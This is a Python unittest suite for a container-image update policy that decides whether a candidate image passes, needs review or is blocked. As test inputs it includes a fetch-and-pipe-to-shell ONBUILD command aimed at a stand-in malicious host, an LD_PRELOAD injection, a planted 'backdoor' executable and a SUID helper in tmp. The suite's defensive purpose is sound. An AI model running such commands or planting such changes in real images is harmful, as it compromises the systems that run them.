import copy
import json
import pathlib
import sys
import tempfile
import unittest

ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / 'scripts'))
from evaluate import compare_versions, evaluate, load  # noqa: E402


def code(sha='aaa', mode='0o755', suid=False):
    return {'sha256': sha, 'mode': mode, 'suid_or_sgid': suid, 'exec_bits': True, 'size': 1}


def deb(name, version, files=()):
    return {'name': name, 'version': version, 'type': 'deb',
            'metadata': {'files': [{'path': '/' + f} for f in files]}}


class PolicyTests(unittest.TestCase):
    """Baseline: curl 1 -> 2 changes its own binary; JAVA_VERSION bumps and Java files change."""

    def setUp(self):
        self.tempdir = tempfile.TemporaryDirectory()
        self.root = pathlib.Path(self.tempdir.name)
        self.platform = 'linux-amd64'
        self.old_cfg = {'config': {'User': '10001', 'Entrypoint': ['/__cacert_entrypoint.sh'],
                                   'Env': ['PATH=/usr/bin', 'JAVA_VERSION=jdk-21.0.8+9']}}
        self.new_cfg = {'config': {'User': '10001', 'Entrypoint': ['/__cacert_entrypoint.sh'],
                                   'Env': ['PATH=/usr/bin', 'JAVA_VERSION=jdk-21.0.9+10']}}
        self.old_packages = {'artifacts': [deb('curl', '8.5.0-1', ['usr/bin/curl'])]}
        self.new_packages = {'artifacts': [deb('curl', '8.5.0-2', ['usr/bin/curl'])]}
        self.old_fs = {'files': {'usr/bin/curl': code('c1'), 'opt/java/openjdk/bin/java': code('j1'),
                                 '__cacert_entrypoint.sh': code('e1')},
                       'sensitive_files': {}, 'symlinks': {}}
        self.new_fs = {'files': {'usr/bin/curl': code('c2'), 'opt/java/openjdk/bin/java': code('j2'),
                                 '__cacert_entrypoint.sh': code('e1')},
                       'sensitive_files': {}, 'symlinks': {}}
        self.old_scan = {'matches': []}
        self.new_scan = {'matches': []}
        self.policy = load(ROOT / 'policy/config.json')

    def tearDown(self):
        self.tempdir.cleanup()

    def run_policy(self, signature='verified', provenance='verified'):
        pairs = {'config': (self.old_cfg, self.new_cfg), 'syft': (self.old_packages, self.new_packages),
                 'fs': (self.old_fs, self.new_fs), 'grype': (self.old_scan, self.new_scan)}
        for ext, (old, new) in pairs.items():
            (self.root / f'old-{self.platform}.{ext}.json').write_text(json.dumps(old))
            (self.root / f'candidate-{self.platform}.{ext}.json').write_text(json.dumps(new))
        return evaluate(self.root, ['linux/amd64'], signature, provenance, self.policy)

    def assertDecision(self, expected, reason_fragment=None, **kw):
        result = self.run_policy(**kw)
        self.assertEqual(result['decision'], expected, json.dumps(result, indent=1))
        if reason_fragment:
            reasons = result['block_reasons'] + result['review_reasons']
            self.assertTrue(any(reason_fragment in r for r in reasons), reasons)
        return result

    # --- explained changes pass ------------------------------------------------------------
    def test_package_and_vendor_bump_cannot_auto_approve_changed_code(self):
        result = self.assertDecision('REVIEW')
        self.assertEqual(result['platforms']['linux/amd64']['changed_code_file_count'], 2)

    def test_usrmerge_alias_ownership(self):
        self.old_packages = {'artifacts': [deb('curl', '8.5.0-1', ['bin/curl'])]}
        self.new_packages = {'artifacts': [deb('curl', '8.5.0-2', ['bin/curl'])]}
        self.assertDecision('REVIEW')

    def test_expected_env_change_only(self):
        self.assertDecision('REVIEW')
        self.new_cfg['config']['Env'].append('LD_PRELOAD=/tmp/x.so')
        self.assertDecision('REVIEW', 'unexpected Env variables changed')

    # --- evidence gates --------------------------------------------------------------------
    def test_unverified_evidence_requires_manual_review(self):
        self.assertDecision('REVIEW', 'publisher signature', signature='not_verified')
        self.assertDecision('REVIEW', 'build provenance', provenance='not_verified')

    def test_empty_platform_list_is_rejected(self):
        with self.assertRaises(ValueError):
            evaluate(self.root, [''], 'verified', 'verified', self.policy)

    # --- config ----------------------------------------------------------------------------
    def test_changed_entrypoint_is_review(self):
        self.new_cfg['config']['Entrypoint'] = ['/evil']
        self.assertDecision('REVIEW', 'Entrypoint')

    def test_unexpected_label_change_is_review(self):
        self.new_cfg['config']['Labels'] = {'maintainer': 'someone-else'}
        self.assertDecision('REVIEW', 'unexpected Labels changed')

    def test_new_onbuild_instruction_is_blocked(self):
        self.new_cfg['config']['OnBuild'] = ['RUN curl https://mal.example/x.sh | sh']
        self.assertDecision('BLOCK', 'ONBUILD')

    # --- packages --------------------------------------------------------------------------
    def test_new_package_requires_review(self):
        self.new_packages['artifacts'].append(deb('unexpected-daemon', '1'))
        self.assertDecision('REVIEW', 'previously absent packages added')

    def test_removed_package_requires_review(self):
        self.old_packages['artifacts'].append(deb('ca-certificates', '20240203'))
        self.assertDecision('REVIEW', 'packages removed')

    def test_package_downgrade_requires_review(self):
        self.old_packages['artifacts'].append(deb('openssl', '3.0.15-1'))
        self.new_packages['artifacts'].append(deb('openssl', '3.0.1-1'))
        result = self.assertDecision('REVIEW', 'package downgrades')
        self.assertEqual(result['platforms']['linux/amd64']['package_downgrades'][0]['new'], '3.0.1-1')

    # --- code files ------------------------------------------------------------------------
    def test_unowned_executable_outside_watch_dirs_is_review(self):
        self.new_fs['files']['usr/lib/x86_64-linux-gnu/libhelper.so'] = code(mode='0o644')
        self.assertDecision('REVIEW', 'new code files not explained')

    def test_new_executable_in_usr_local_is_review(self):
        self.new_fs['files']['usr/local/bin/backdoor'] = code()
        self.assertDecision('REVIEW', 'watched locations')

    def test_new_vendor_file_without_version_change_is_review(self):
        self.new_cfg['config']['Env'] = list(self.old_cfg['config']['Env'])
        self.new_fs['files']['opt/java/openjdk/bin/java'] = code('j1')
        self.new_fs['files']['opt/java/openjdk/bin/helper'] = code()
        self.assertDecision('REVIEW', 'new code files not explained')

    def test_new_vendor_file_with_version_change_requires_review(self):
        self.new_fs['files']['opt/java/openjdk/bin/jwebserver'] = code()
        self.assertDecision('REVIEW')

    def test_binary_changed_without_package_version_change_is_review(self):
        self.new_packages = copy.deepcopy(self.old_packages)
        self.assertDecision('REVIEW', 'changed without a matching package/vendor version change')

    def test_root_level_entrypoint_script_change_is_review(self):
        self.new_fs['files']['__cacert_entrypoint.sh'] = code('e2')
        self.assertDecision('REVIEW', 'watched locations')

    def test_added_suid_is_blocked(self):
        self.new_fs['files']['tmp/helper'] = code(suid=True, mode='0o4755')
        self.assertDecision('BLOCK', 'SUID/SGID')

    def test_world_writable_code_is_review(self):
        self.new_fs['files']['usr/bin/curl'] = code('c2', mode='0o777')
        self.assertDecision('REVIEW', 'world-writable')

    # --- links -----------------------------------------------------------------------------
    def test_code_file_replaced_by_symlink_is_review(self):
        del self.new_fs['files']['opt/java/openjdk/bin/java']
        self.new_fs['symlinks']['opt/java/openjdk/bin/java'] = '../../../../usr/lib/jvm-helper'
        self.assertDecision('REVIEW', 'replaced by symlinks')

    def test_symlink_into_tmp_is_review(self):
        self.new_fs['symlinks']['usr/bin/javac'] = '../../tmp/.helper'
        self.assertDecision('REVIEW', 'symlinks into watched locations')

    def test_same_dir_library_symlink_retarget_is_review(self):
        self.old_fs['symlinks']['usr/lib/libz.so.1'] = 'libz.so.1.3'
        self.new_fs['symlinks']['usr/lib/libz.so.1'] = 'libz.so.1.3.1'
        self.assertDecision('REVIEW')

    # --- sensitive files -------------------------------------------------------------------
    def test_sensitive_config_file_change_is_review(self):
        self.old_fs['sensitive_files'] = {'etc/profile': {'sha256': 'a'}}
        self.new_fs['sensitive_files'] = {'etc/profile': {'sha256': 'b'}}
        self.assertDecision('REVIEW', 'security-sensitive')

    # --- vulnerabilities -------------------------------------------------------------------
    def _vuln(self, severity):
        return {'vulnerability': {'id': 'CVE-EXAMPLE-0001', 'severity': severity, 'fix': {'versions': ['2.0']}},
                'artifact': {'name': 'curl'}}

    def test_new_fixable_critical_is_blocked(self):
        self.new_scan['matches'].append(self._vuln('Critical'))
        self.assertDecision('BLOCK', 'Critical')

    def test_new_fixable_high_is_review(self):
        self.new_scan['matches'].append(self._vuln('High'))
        self.assertDecision('REVIEW', 'High')

    def test_preexisting_critical_does_not_auto_block_but_code_changes_still_review(self):
        self.old_scan['matches'].append(self._vuln('Critical'))
        self.new_scan['matches'].append(self._vuln('Critical'))
        self.assertDecision('REVIEW')

    def test_unfixed_critical_blocks(self):
        vuln = self._vuln('Critical')
        vuln['vulnerability']['fix']['versions'] = []
        self.new_scan['matches'].append(vuln)
        self.assertDecision('BLOCK', 'Critical')

    def test_non_executable_interpreted_module_modified_requires_review(self):
        self.old_fs['files']['usr/share/app/helper.py'] = {'sha256': 'old', 'mode': '0o644', 'is_code': True}
        self.new_fs['files']['usr/share/app/helper.py'] = {'sha256': 'new', 'mode': '0o644', 'is_code': True}
        self.assertDecision('REVIEW', 'changed code files')

    def test_executable_removal_requires_review(self):
        del self.new_fs['files']['usr/bin/curl']
        self.assertDecision('REVIEW', 'code files removed')

    def test_clean_identical_image_auto_passes_when_supplier_evidence_verified(self):
        self.new_fs = copy.deepcopy(self.old_fs)
        self.new_packages = copy.deepcopy(self.old_packages)
        self.new_cfg = copy.deepcopy(self.old_cfg)
        self.assertDecision('AUTO_PASS')

    def test_missing_grype_schema_fails_closed(self):
        self.new_scan = {}
        with self.assertRaises(ValueError):
            self.run_policy()

    def test_missing_sbom_schema_fails_closed(self):
        self.new_packages = {}
        with self.assertRaises(ValueError):
            self.run_policy()


class VersionCompareTests(unittest.TestCase):
    def test_dpkg_ordering(self):
        cases = [('3.0.15-1', '3.0.1-1', 1), ('1.0~rc1', '1.0', -1), ('1:1.0', '2.0', 1),
                 ('8.5.0-2ubuntu1', '8.5.0-2', 1), ('1.0-1', '1.0-1', 0), ('2.10', '2.9', 1),
                 ('1.2.3a', '1.2.3', 1)]
        for a, b, sign in cases:
            result = compare_versions(a, b)
            self.assertEqual((result > 0) - (result < 0), sign, (a, b))


if __name__ == '__main__':
    unittest.main()
